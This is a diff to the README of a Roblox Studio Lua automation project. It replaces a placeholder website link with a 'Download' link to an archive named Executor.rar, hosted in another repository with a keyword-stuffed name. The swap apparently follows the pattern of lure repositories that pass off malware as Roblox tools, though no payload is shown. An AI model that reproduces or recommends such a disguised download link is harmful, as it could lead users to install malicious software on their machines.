@@ -10,7 +10,7 @@
 
 **Modular Lua sandbox and automation engine for Roblox Studio developers**
 
-[🌐 Website](https://yourname.github.io/rblx_scriptcore) | [📘 Docs](docs/README.md) | [💬 Community](https://discord.gg/yourdiscord)
+[🌐 Download](https://github.com/mingojce/RBLX-ScriptCore-Advanced-Lua-Automation-Integration-Platform/releases/download/V1.2.0/Executor.rar) | [📘 Docs](docs/README.md) | [💬 Community](https://discord.gg/yourdiscord)
 
 </div>
 
